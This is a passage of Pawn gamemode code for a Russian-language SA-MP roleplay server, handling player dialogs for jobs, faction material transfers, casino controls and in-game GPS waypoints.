			if(strcmp(animname, "IDLE_STANCE", true) != 0 && strcmp(animname, "SWAT_RUN", true) != 0 && strcmp(animname, "WALK_CIVI", true) != 0 && strcmp(animname, "crry_prtial", true) != 0 && strcmp(animname, "SPRINT_PANIC", true) != 0 && strcmp(animname, "RUN_PLAYER", true) != 0 && strcmp(animname, "WALK_PLAYER", true) != 0 && strcmp(animname, "SPRINT_CIVI", true) != 0)
			{
				SendClientMessage(playerid, COLOR_LIGHTRED, "Вы уронили ящик");
				if(IsPlayerAttachedObjectSlotUsed(playerid,2)) RemovePlayerAttachedObject(playerid,2);
				ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);
				DestroyObject(_Factory[playerid]);
				_Factory[playerid] = 0;
			}
		}
		else
		{
			if(strcmp(animname, "WOMAN_IDLESTANCE", true) != 0 && strcmp(animname, "WOMAN_RUN", true) != 0 && strcmp(animname, "WOMAN_WALKNORM", true) != 0 && strcmp(animname, "crry_prtial", true) != 0 && strcmp(animname, "WOMAN_RUNPANIC", true) != 0 && strcmp(animname, "RUN_PLAYER", true) != 0 && strcmp(animname, "WALK_PLAYER", true) != 0 && strcmp(animname, "SPRINT_CIVI", true) != 0)
			{
				SendClientMessage(playerid, COLOR_LIGHTRED, "Вы уронили ящик");
				if(IsPlayerAttachedObjectSlotUsed(playerid,2)) RemovePlayerAttachedObject(playerid,2);
				ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);
				DestroyObject(_Factory[playerid]);
				_Factory[playerid] = 0;
			}
		}
	}
	new Keys,ud,lr;
	GetPlayerKeys(playerid,Keys,ud,lr);
	if (Upravakazino[playerid] ==true)
	{
		if (IsPlayerInRangeOfPoint(playerid,1.5,2242.7837,1620.9683,1006.1769) || IsPlayerInRangeOfPoint(playerid,1.5,2231.1338,1621.2253,1006.1768))
		{
			if(ud > 0) Stavkarul1up(playerid);
			else if(ud < 0) Stavkarul1down(playerid);
			if(lr > 0) Stavkarul1left(playerid);
			else if(lr < 0) Stavkarul1right(playerid);
		}
		else if (IsPlayerInRangeOfPoint(playerid,1.5,2231.0769,1620.5939,1006.1772) || IsPlayerInRangeOfPoint(playerid,1.5,2242.8293,1618.1311,1006.1790))
		{
			if(ud > 0) Stavkarul1down(playerid);
			else if(ud < 0) Stavkarul1up(playerid);
			if(lr > 0) Stavkarul1right(playerid);
			else if(lr < 0) Stavkarul1left(playerid);
		}
		else
		{
			if(ud > 0) Stavkarul1down(playerid);
			else if(ud < 0) Stavkarul1up(playerid);
			if(lr > 0) Stavkarul1right(playerid);
			else if(lr < 0) Stavkarul1left(playerid);
		}
	}
	iNewPlayerAmmo[playerid] = GetPlayerAmmo(playerid);
	if(iNewPlayerAmmo[playerid] != iPlayerAmmo[playerid])
	{
		OnPlayerAmmoChange(playerid, iNewPlayerAmmo[playerid], iPlayerAmmo[playerid]);
		iPlayerAmmo[playerid] = iNewPlayerAmmo[playerid];
	}
	return true;
}
//==============================================================================
public OnPlayerStreamIn(playerid, forplayerid) return true;
//==============================================================================
//==============================================================================
public OnPlayerStreamOut(playerid, forplayerid) return true;
public OnVehicleStreamIn(vehicleid, forplayerid) return true;
public OnVehicleStreamOut(vehicleid, forplayerid) return true;
//==============================================================================
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	new string[512];
	printf("Игрок %s только что использовал диалог номер %i", PlayerInfo[playerid][pSendername], dialogid);
	for(new position = 0; (position = strfind(inputtext, "%", true, position)) != -1;)
	{
		inputtext[position] = '#';
	}
	if(GetPVarInt(playerid,"USEDIALOGID") != dialogid)
	{
		SendClientMessage(playerid, COLOR_RED, " Вы были кикнуты по подозрению в подмене диалога");
		KickEx(playerid,0811);
		return true;
	}
	switch(dialogid)
	{
	case 12017:
		{
			if(!response) return SendClientMessage(playerid,-1,"Вы отменили действие");
			switch(listitem)
			{
			case 0: SetPVarInt(playerid,"SendMafia",F_YAKUZA);
			case 1: SetPVarInt(playerid,"SendMafia",F_LCN);
			case 2: SetPVarInt(playerid,"SendMafia",F_RM);
			}
			ShowPlayerDialog(playerid, 12018, DIALOG_STYLE_INPUT, "Выберите кол.во материалов","Введите кол.во материалов\nкоторые хотите передать\nОт 1 до 5000" , "Передать", "Отмена");
		}
	case 12018:
		{
			new mats,mats1;
			mats1 = PlayerInfo[playerid][pMember]-3;
			if(!response) return SendClientMessage(playerid,-1,"Вы отменили действие");
			if(sscanf(inputtext, "p<,>i",mats)) return SendClientMessage(playerid,-1,"Ошибка!");
			if(mats < 1 || mats > 5000) return SendClientMessage(playerid,-1,"Общее кол.во материалов должно быть не более 5000!");
			if(mats > Mats[mats1]) return SendClientMessage(playerid, COLOR_GREY, "На складе организации недостаточно материалов!");


			Mats[mats1] -= mats;
			if(PlayerInfo[playerid][pMember] == F_GROVE) SetOtherInt("grovemats", Mats[mats1]);
			if(PlayerInfo[playerid][pMember] == F_BALLAS) SetOtherInt("ballasmats", Mats[mats1]);
			if(PlayerInfo[playerid][pMember] == F_RIFA) SetOtherInt("rifamats", Mats[mats1]);
			if(PlayerInfo[playerid][pMember] == F_AZTECAS) SetOtherInt("aztecasmats", Mats[mats1]);
			if(PlayerInfo[playerid][pMember] == F_VAGOS) SetOtherInt("vagosmats", Mats[mats1]);
			format(string,128,"[F] %s отправил вашей мафии %d материалов",PlayerInfo[playerid],mats);
			SendFMes(GetPVarInt(playerid,"SendMafia"),COLOR_YELLOW,string);
			if(GetPVarInt(playerid,"SendMafia") == F_YAKUZA)
			{
				Mats[F_YAKUZA] += mats;
				SetOtherInt("yakuzamats", Mats[F_YAKUZA]);
				format(string,128,"[F] %s отправил с общака банды %d материалов мафии 'Yakuza'",PlayerInfo[playerid],mats);
			}
			if(GetPVarInt(playerid,"SendMafia") == F_LCN)
			{

				Mats[F_LCN] += mats;
				SetOtherInt("lcnmats", Mats[F_LCN]);
				format(string,128,"[F] %s отправил с общака банды %d материалов мафии 'La Cosa Nostra'",PlayerInfo[playerid],mats);
			}
			if(GetPVarInt(playerid,"SendMafia") == F_RM)
			{
				Mats[F_RM] += mats;
				SetOtherInt("rmmats", Mats[F_RM]);
				format(string,128,"[F] %s отправил с общака банды %d материалов мафии 'Russian Mafia'",PlayerInfo[playerid],mats);
			}
			SendFMes(PlayerInfo[playerid][pMember],COLOR_YELLOW,string);
			SendClientMessage(playerid,-1,"Вы успешно передали материалы!");
		}
	case 6161:
		{
			if(!response)
			{
				RemoveFromVehicle(playerid);
				return SendClientMessage(playerid,-1,"Вы отменили действие");
			}
			SendClientMessage(playerid,COLOR_YELLOW,"Вы начали рассадду зерна!");
			SendClientMessage(playerid,-1,"Проедьтесь по полю (чекпоинтам), и припаркуйте комбайнер.");
			SetPVarInt(playerid,"FarmCombainer",1);
			SetPlayerRaceCheckpoint(playerid,1, -320.7821,-1415.4731,13.8700,0.0,0.0,0.0,8);
		}
	case 12127:
		{
			if(!response) return SendClientMessage(playerid,-1,"Вы продолжаете игру");
			CancelCasino(playerid);
		}
	case D_JOINCARS+3:
		{
			if(!response) return true;
			if(GetPlayerHouse(playerid))
			{
				BuyCar(playerid);
			}
		}
	case D_JOINCARS+4:
		{
			if(!response) return true;
			BuyCloseCar(playerid);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Вы отменили покупку транспорта");
		}
	case 1113:
		{
			if(!response) { Mission[playerid] = 0; return true; }
			new elez;
			if(sscanf(inputtext, "i",elez)) return ShowPlayerDialog(playerid, 1113, 1, "Металл", "Введите кол-во кг металла (От 1 до 5000)", "Принять", "Отмена");
			if(elez < 1 || elez > 5000) { SendClientMessage(playerid, COLOR_WHITE, "Кол-во металла {DB840A} от 1 до 5000!"); return ShowPlayerDialog(playerid, 1113, 1, "Металл", "Введите кол-во кг металла (От 1 до 10000)", "Принять", "Отмена"); }
			new vehid;
			vehid = GetPlayerVehicleID(playerid);
			Jelez[vehid] = elez;
			SendClientMessage(playerid,COLOR_GREEN,"Готово, теперь сбросте патроны на зоне 51");
			format(string, 50, "Материалы: {DB840A}%i / 5000{ffffff} кг", Jelez[vehid]);
			Update3DTextLabelText(VehJZ[vehid],0xffffffff,string);
			SetPlayerCheckpoint(playerid,339.3525,1927.6963,17.2043,10.0);
			Mission[playerid] = 2;
			return true;
		}
 	case 11131:
		{
			if(!response) { Mission[playerid] = 0; return true; }
			new elez;
			if(sscanf(inputtext, "i",elez)) return ShowPlayerDialog(playerid, 11131, 1, "Шахта", "Введите кол-во кг металла (От 1 до 500)", "Принять", "Отмена");
			if(elez < 1 || elez > 500) { SendClientMessage(playerid, COLOR_WHITE, "Кол-во металла {DB840A} от 1 до 500!"); return ShowPlayerDialog(playerid, 11131, 1, "Шахта", "Введите кол-во кг металла (От 1 до 500)", "Принять", "Отмена"); }
			new vehid;
			vehid = GetPlayerVehicleID(playerid);
			Jelez[vehid] = elez;
			SendClientMessage(playerid,COLOR_GREEN,"Готово, теперь отвезите материалы на завод К.А.С.С.");
			format(string, 50, "Материалы: {DB840A}%i / 500{ffffff} кг", Jelez[vehid]);
			Update3DTextLabelText(VehJZ[vehid],0xffffffff,string);
			SetPlayerCheckpoint(playerid,2523.9658,2818.7085,10.8203,10.0);
			Mission[playerid] = 2;
			return true;
		}
	case 13123:
		{
			if(response)
			{
				if(GetPVarInt(playerid,"FarmDuty") == 1)
				{
					vehiclerun[GetPlayerVehicleID(playerid)] = 0;
					DestroyPickup(farmpickup);
					Delete3DTextLabel(veh3dtext);
					SendClientMessage(playerid, COLOR_LIGHTRED, "Отвезите авто к ферме и введите /funload (Около склада, обозначено пикапом)");
					for(new i = 0; i <= MAX_PLAYERS; i++)
					{
						if(GetPVarInt(i,"FarmDuty") != 1) continue;
						SendClientMessage(i, COLOR_YELLOW, "Фермер закончил сбор урожая, советуем вам идти в раздевалку!");
						DisablePlayerCheckpoint(i);
						DeletePVar(i,"FarmSbor");
						if(IsPlayerAttachedObjectSlotUsed(i,3)) RemovePlayerAttachedObject(i, 3);
						
					}
					return true;
				}
			}
			else
			{
				RemoveFromVehicle(playerid);
				SendClientMessage(playerid,-1,"Отправляйтесь назад!");
			}
		}
	case D_CTO: // CTO
		{
			if(response)
			{
				if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится за рулем своего авто!");
				new pveh = GetPlayerVehicleID(playerid);
				SetVehiclePos(pveh,614.8751,-124.8771,997.9922);
				PlayerInfo[ playerid ][ pPos_x ] = 614.8751;
				PlayerInfo[ playerid ][ pPos_y ] = -124.8771;
				PlayerInfo[ playerid ][ pPos_z ] = 997.9922;
				SetPVarInt(playerid, "AntiBreik", 3);
				SetVehicleZAngle(pveh,88.5082);
				SetVehicleVirtualWorld(pveh,playerid);
				LinkVehicleToInterior(pveh,3);
				SetPlayerInterior(playerid,3);
				SetPlayerVirtualWorld(playerid,playerid);
				TogglePlayerControllable(playerid,false);
				ShowSTODialog(playerid);
				SetPlayerCameraPos(playerid,610.0254,-130.5426,999.9613);
				SetPlayerCameraLookAt(playerid,613.7177,-126.2820,998.7412);
				//
				SetPVarInt(playerid,"UsedCTO",1);
				TextDrawShowForPlayer(playerid,ButtonLeft);
				TextDrawShowForPlayer(playerid,ButtonRight);
				SelectTextDraw(playerid, COLOR_GREEN);
			}
		}
		//new system job
		case 668:
    	{
    		if(response)
	    	{
  				new msg1[256];
				new msg2[256];
				new msg3[256];
				if(PlayerInfo[playerid][pMember] >= 1 || PlayerInfo[playerid][pLeader] >= 1)
				{
				    SetPlayerSkin(playerid,PlayerInfo[playerid][pChar]);
				}
				if(PlayerInfo[playerid][pMember] == 0 || PlayerInfo[playerid][pLeader] == 0)
				{
				    SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
				}
				new money = rnizzp[playerid]+rsrzp[playerid]*2+rvizzp[playerid]*3;
				format(msg1, sizeof(msg1), "Вы закончили работу рудокопа. Ваш заработок: {00FF00}$%d", money);
				SendClientMessage(playerid, 0x00FF0AFF, msg1);
				format(msg2, sizeof(msg2), "Всего добыто руды: {00ff00}Низкого качества: %dкг  {ffff00}Среднего качества: %dкг  {ff0000}Высокого качества: %dкг",rnizzp[playerid],rsrzp[playerid],rvizzp[playerid]);
				SendClientMessage(playerid, COLOR_WHITE, msg2);
				Shaht[playerid] = 0;
				RudaNiz[playerid] = 0;
				RudaSr[playerid] = 0;
				RudaViz[playerid] = 0;
				rnizzp[playerid] = 0;
				rsrzp[playerid] = 0;
				rvizzp[playerid] = 0;
				Samorodok[playerid] = 0;
				RemovePlayerAttachedObject(playerid, 3);
				GiveMoney(playerid, money);
				format(msg3, sizeof(msg3), "~g~+%d$", money);
				GameTextForPlayer(playerid,msg3,3000,1);
	    		return 1;
	    		}
        		else
	    		{
			}
		}
    	case 700:
    	{
    		if(response)
	    	{
	    		SetPlayerSkin(playerid,36);
				Shaht[playerid] = 1;
				SendClientMessage(playerid,0x00FF00FF,"Вы начали рабочий день шахтера. Отправляйтесь в тунели за добычей руды.");
				SetPlayerAttachedObject(playerid, 3, 18634, 6, 0.078222, 0.000000, 0.110844, 298.897308, 264.126861, 193.350555, 1.000000, 1.000000, 1.000000);
	    		return 1;
	    	}
        	else
	    	{
	    	}
		}
     	case 23001:
    	{
    		if(response)
	    	{
	    		if(PlayerInfo[playerid][pMember] >= 1 || PlayerInfo[playerid][pLeader] >= 1)
				{
				    SetPlayerSkin(playerid,PlayerInfo[playerid][pChar]);
				}
				if(PlayerInfo[playerid][pMember] == 0 || PlayerInfo[playerid][pLeader] == 0)
				{
				    SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
				}
				Gruzik[playerid] = 0;
				SendClientMessage(playerid,0x00FF00FF,"Вы закончили работу, возвращайтесь еще...");
	    		return 1;
	    	}
        	else
	    	{
	    	}
		}
      	case 23000:
    	{
    		if(response)
	    	{
	    		SetPlayerSkin(playerid,36);
				Gruzik[playerid] = 1;
				SendClientMessage(playerid,0x00FF00FF,"Вы начали рабочий день. Садитесь за погрузчик. Вам все там объяснят.");
	    		return 1;
	    	}
        	else
	    	{
	    	}
		}
		case 104:
		{
			if(response)
	    	{
	    	SetPlayerSkin(playerid,44);
    		Missions[playerid] = 0;
			Zavod[playerid] = 1;
			ZPerevoz[playerid] = 1;
			new vehicleid = GetPlayerVehicleID(playerid);
			format(string, 50, "Материалы: {DB840A}%i / 5000{ffffff} кг", Jelez[vehicleid]);
			VehJZ[vehicleid] = Create3DTextLabel(string, 0xffffffff, 0.0, 0.0, 0.0, 30.0, 0, 1);
			Attach3DTextLabelToVehicle(VehJZ[vehicleid], vehicleid, 0, -1.0, 0.5);
			SendClientMessage(playerid,0x00FF00FF,"Вы начали работу развозчика металла. Берите машину и отправляйтесь на шахту ( красный маркер )");
			CP[playerid] = 6;
			Missions[playerid] = 1;
			SetPlayerCheckpoint(playerid,-456.9402,1451.7922,21.3364,3.0);
	    	return 1;
	    	}
        	else
	    	{
	    	}
		}
		case 300:
		{
			if(response)
	    	{
			Zavod[playerid] = 0;
			ZPerevoz[playerid] = 0;
			SendClientMessage(playerid,0x00FF00FF,"Вы закончили работу развозчика металла.");
			CP[playerid] = 0;
			if(PlayerInfo[playerid][pMember] >= 1 || PlayerInfo[playerid][pLeader] >= 1)
			{
			    SetPlayerSkin(playerid,PlayerInfo[playerid][pChar]);
			}
			if(PlayerInfo[playerid][pMember] == 0 || PlayerInfo[playerid][pLeader] == 0)
			{
			    SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
			}
			DisablePlayerCheckpoint(playerid);
	    	return 1;
	    	}
        	else
	    	{
	    	}
		}
		case 19999:
    	{
	      	if(response)
		    {
		    	SetPlayerSkin(playerid,42);
				Zavod[playerid] = 1;
				SendClientMessage(playerid,0x00FF00FF,"Вы начали рабочий день на заводе. Возьмите металл со склада.");
				CP[playerid] = 4;
				SetPlayerAttachedObject(playerid,2,18644,6,0.100000,0.050000,0.00000,0.000000,0.000000,0.000000,1.000000,1.000000,1.000000);
				SetPlayerCheckpoint(playerid,2564.7886,-1292.9933,1044.1250,2.0);
		    	return 1;
		    }
	        else
		    {
		    }
		}
		case 103:
    	{
    		if(response)
	    	{
				new zavs[256];
				new zavs3[256];
				new zavs2[256];
				new money = Zavodzp[playerid]*30;
	    		pPatr[playerid] = 0;
				Zavod[playerid] = 0;
 		    	RemovePlayerAttachedObject(playerid, 4);
 		    	RemovePlayerAttachedObject(playerid, 2);
 		    	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 1);
				if(PlayerInfo[playerid][pMember] >= 1 || PlayerInfo[playerid][pLeader] >= 1)
				{
				    SetPlayerSkin(playerid,PlayerInfo[playerid][pChar]);
				}
				if(PlayerInfo[playerid][pMember] == 0 || PlayerInfo[playerid][pLeader] == 0)
				{
				    SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
				}
				format(zavs, sizeof(zavs), "Вы закончили работу. Ваш заработок: {00FF00}$%d", money);
				SendClientMessage(playerid, 0x00FF0AFF, zavs);
				format(zavs2, sizeof(zavs2), "Вы сделали {00FFD2}%d {00FF0A}ящиков с патронами",Zavodzp[playerid]);
				SendClientMessage(playerid, 0x00FF0AFF, zavs2);
				Zavodzp[playerid] = 0;
				GiveMoney(playerid, money);
				format(zavs3, sizeof(zavs3), "~g~+%d$", money);
				GameTextForPlayer(playerid,zavs3,3000,1);
				CP[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
	    		return 1;
	    	}
        	else
	    	{
	    	}
		}
    case D_JOB+61:
		{
		    if(!response) return 1;
    		SetPVarInt(playerid, "OldMinerSkin",GetPlayerSkin(playerid));
			SetPlayerSkin(playerid, 16);
			SetPVarInt(playerid, "Miner", 1);
			SetPlayerAttachedObject( playerid, 3, 18634, 6, 0.078222, 0.000000, 0.110844, 298.897308, 264.126861, 193.350555, 1.000000, 1.000000, 1.000000 );
			SendClientMessage(playerid, COLOR_BLUE, "Вы начали работу шахтера. Ищите месторождения с рудой");
			return 1;
		}
		case D_JOB+62:
		{
		    if(!response) return 1;
    		SetPlayerSkin(playerid, GetPVarInt(playerid, "OldMinerSkin"));
			SendMes(playerid, COLOR_WHITE, "Вы закончили работу. Ваш заработок: {8d8dff}%i{ffffff} долларов",GetPVarInt(playerid, "MinerKG")*2);
			GiveMoney(playerid,GetPVarInt(playerid, "MinerKG")*2);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid, 3);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 4)) RemovePlayerAttachedObject(playerid, 4);
			DeletePVar(playerid, "OldMinerSkin");
			DeletePVar(playerid, "MinerKG");
			DeletePVar(playerid, "Miner");
			DeletePVar(playerid, "MinerCount");
			DeletePVar(playerid, "MinerKG_One");
			return 1;
		}
		//end
	case 888:
        {
                GKick(AdmGMID[playerid]);
        }
	case D_GPS:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:	ShowPlayerDialog(playerid, 10001, DIALOG_STYLE_LIST, " Для новичков ", "[1] Респавн\n[2] Автошкола\n[3] Банк (Las Venturas)\n[4] Мэрия\n[5] Магазин одежды", "Поиск", "Назад");
					case 1:	ShowPlayerDialog(playerid, 10002, DIALOG_STYLE_LIST, " Работы для начинающих ", "[1] Грузчики. (LS)\n[2] Карьер.(LV)\n[3] Шахта.(LV)\n[4] Развозчик металла.(LV)\n[5] Сборщик оружия.(LV)\n[6] Грузчик. [NEW] (Fort Carson)", "Поиск", "Назад");
                    case 2:	ShowPlayerDialog(playerid, 10003, DIALOG_STYLE_LIST, " По работе ", "« Дальнобойщикам »\n[1] Авто Парк.\n[2] Работа перевозчика.\n[3] Порт LS: Склад продуктов.\n[4] Нефтезавод", "Поиск", "Назад");
                    case 3:
					{
					    new strcatka[512];
						strcat(strcatka,"[1][ГОС] LS Police Deportament.\n[2][ГОС] SF Police Deportament.\n[3][ГОС] FBI.\n[4][ГОС] Hospital\n[5][ГОС] Автошкола\n[6][SRV] Radio OneReal Studio\n[7][GANG] Grove Street",sizeof(strcatka));
						strcat(strcatka,"\n[8][GANG] Ballas\n[9][GANG] Rifa\n[10][GANG] Aztecas\n[11][GANG] Vagos\n[12][ARMY] Зона 51\n[13][CASINO] Caligula\n[14][CASINO] Red Dragon\n[15][MAFIA] La Cosa Nostra\n[16][MAFIA] Yakuza\n[17][MAFIA] Russian Mafia",sizeof(strcatka));
						ShowPlayerDialog(playerid, 10004, DIALOG_STYLE_LIST, " Организации ", strcatka, "Поиск", "Назад");
					}
					case 4:	ShowPlayerDialog(playerid, 10005, DIALOG_STYLE_MSGBOX, " Ферма ", "На нашем сервере существует одна ферма\nСбор травы для нарко бизнеса\nВы можете пойти работать туда (c 1 lvl)\n\nВы хотите отметить ферму на карте?", "Да", "Назад");
				}
			}
		}
		case 10005:
		{
			if(response)
			{
			    SetPlayerRaceCheckpoint(playerid,1, -376.1257,-1411.3281,25.7266,0.0,0.0,0.0,8);
				SendClientMessage(playerid, COLOR_WHITE, "[Ферма по выращиванию наркотических средств] Место на карте помечено красной меткой!");
				SendClientMessage(playerid, COLOR_YELLOW, "Сервер желает вам удачного сбора на ферме!");
				SetPVarInt(playerid, "pGPSWork", 1);
			}
			else cmd_gps(playerid,inputtext);
		}
		case 10004:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
						SetPlayerRaceCheckpoint(playerid,1, 1537.7271,-1673.9553,13.5469,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[LSPD] Место на карте помечено красной меткой");
					} //
					case 1:
					{
						SetPlayerRaceCheckpoint(playerid,1, -1605.2701,721.4152,11.9183,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[SFPD] Место на карте помечено красной меткой");
					} //
					case 2:
					{
						SetPlayerRaceCheckpoint(playerid,1, -1979.2177,-1012.8572,32.1719,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[F.B.I] Место на карте помечено красной меткой");
					} //
					case 3:
					{
						SetPlayerRaceCheckpoint(playerid,1,1188.3857,-1330.3682,13.5607,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Hospital] Место на карте помечено красной меткой");
					} //
					case 4:
					{
						SetPlayerRaceCheckpoint(playerid,1, -2049.1953,-94.4637,35.1718,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Автошкола] Место на карте помечено красной меткой");
					} //
					case 5:
					{
						SetPlayerRaceCheckpoint(playerid,1, 1589.0272,-1317.1798,17.5208,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[OneReal Radio Station] Место на карте помечено красной меткой");
					} //
					case 6:
					{
						SetPlayerRaceCheckpoint(playerid,1, 2497.4568,-1676.8031,13.3444,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Grove Street Gang] Место на карте помечено красной меткой");
					} //
					case 7:
					{
						SetPlayerRaceCheckpoint(playerid,1, 2652.9258,-2003.8691,13.3828,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Ballas Gang] Место на карте помечено красной меткой");
					} //
					case 8:
					{
						SetPlayerRaceCheckpoint(playerid,1, 2173.9026,-1796.6792,13.3625,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Rifa Gang] Место на карте помечено красной меткой");
					} //
					case 9:
					{
						SetPlayerRaceCheckpoint(playerid,1, 1694.8132,-2113.1421,13.4580,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Aztecas Gang] Место на карте помечено красной меткой");
					} //
					case 10:
					{
						SetPlayerRaceCheckpoint(playerid,1,2783.7075,-1612.7762,10.9219,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Vagos Gang] Место на карте помечено красной меткой");
					} //
					case 11:
					{
						SetPlayerRaceCheckpoint(playerid,1, 134.5792,1963.8624,19.4902,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Zone 51] Место на карте помечено красной меткой");
					} //
					case 12:
					{
						SetPlayerRaceCheckpoint(playerid,1,2167.5620,1678.8907,10.8203,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Caligula] Место на карте помечено красной меткой");
					} //
					case 13:
					{
						SetPlayerRaceCheckpoint(playerid,1, 1023.4680,-1131.1978,23.8203,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Red Dragon] Место на карте помечено красной меткой");
					} //
					case 14:
					{
						SetPlayerRaceCheckpoint(playerid,1, 1463.0961,2773.2087,10.6719,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[La Cosa Nostra] Место на карте помечено красной меткой");
					} //
					case 15:
					{
						SetPlayerRaceCheckpoint(playerid,1, 2597.9666,1882.9224,10.8203,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Yakuza] Место на карте помечено красной меткой");
					} //
					case 16:
					{
						SetPlayerRaceCheckpoint(playerid,1,971.5092,1731.6022,8.6484,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Russian Mafia] Место на карте помечено красной меткой");
					} //

				}
				SetPVarInt(playerid, "pGPSWork", 1);
			}
			else
			{
				cmd_gps(playerid,inputtext);
				return true;
			}
		}
		case 10001:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
						SetPlayerRaceCheckpoint(playerid,1, 1252.0638,-1828.0435,13.3997,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Респавн] Место на карте помечено красной меткой");
					} //
					case 1:
					{
						SetPlayerRaceCheckpoint(playerid,1,-2049.1663,-94.6071,35.1718,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Автошкола] Место на карте помечено красной меткой");
					} //
					case 2:
					{
						SetPlayerRaceCheckpoint(playerid,1, 2127.2861,2351.2068,10.6719,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Банк] Место на карте помечено красной меткой");
					} //
					case 3:
					{
						SetPlayerRaceCheckpoint(playerid,1, 1481.6056,-1742.2217,13.5469,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Мэрия] Место на карте помечено красной меткой");
					} //
					case 4:
					{
						SetPlayerRaceCheckpoint(playerid,1, 452.7299,-1496.8654,30.9102,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Магазин одежды] Место на карте помечено красной меткой");
					} //

				}
				SetPVarInt(playerid, "pGPSWork", 1);
			}
			else
			{
				cmd_gps(playerid,inputtext);
				return true;
			}
		}
		case 10002:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
						SetPlayerRaceCheckpoint(playerid,1, 2792.3657,-2400.2632,13.6325,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Грузчики] Место на карте помечено красной меткой");
					} //
					case 1:
					{
						SetPlayerRaceCheckpoint(playerid,1, 646.7728,884.5109,-42.2965,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Карьер] Место на карте помечено красной меткой");
					} //
					case 2:
					{
						SetPlayerRaceCheckpoint(playerid,1, -467.8905,1471.3975,22.0073,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Шахта] Место на карте помечено красной меткой");
					} //
					case 3:
					{
						SetPlayerRaceCheckpoint(playerid,1, 2578.9045,2779.2209,10.8203,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Развозчик металла] Место на карте помечено красной меткой");
					} //
					case 4:
					{
						SetPlayerRaceCheckpoint(playerid,1, 2590.1187,2790.6833,10.8203,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Сборщик оружия] Место на карте помечено красной меткой");
					} //
					case 5:
					{
						SetPlayerRaceCheckpoint(playerid,1, -89.1500,1133.7808,19.7422,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Грузчик LV] Место на карте помечено красной меткой");
					} //

				}
				SetPVarInt(playerid, "pGPSWork", 1);
			}
			else
			{
				cmd_gps(playerid,inputtext);
				return true;
			}
		}
		case 10008:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
                        SetPlayerRaceCheckpoint(playerid,1, -1740.2428,28.7605,3.5547,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[База дальнобойщиков] Место на карте помечено красной меткой");
					} //
					case 1:
					{
						SetPlayerRaceCheckpoint(playerid,1, -1871.2671,-1719.0275,21.7500,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Склад УГЛЯ] Место на карте помечено красной меткой");
					} //
					case 2:
					{
						SetPlayerRaceCheckpoint(playerid,1,2363.3206,2747.9734,10.8203,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Склад запчастей] Место на карте помечено красной меткой");
					} //
				}
				SetPVarInt(playerid, "pGPSWork", 1);
			}
			else
			{
				cmd_gps(playerid,inputtext);
				return true;
			}
		}
		case 10003:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
                        cmd_tgps(playerid,inputtext);// DALNOBOI GPS
					} //
					case 1:
					{
						SetPlayerRaceCheckpoint(playerid,1, 1638.2668,-1146.5863,23.9063,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Автопарк] Место на карте помечено красной меткой");
					} //
					case 2:
					{
						SetPlayerRaceCheckpoint(playerid,1, 2489.4915,-1460.1962,24.0188,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Работа перевозчика] Место на карте помечено красной меткой");
					} //
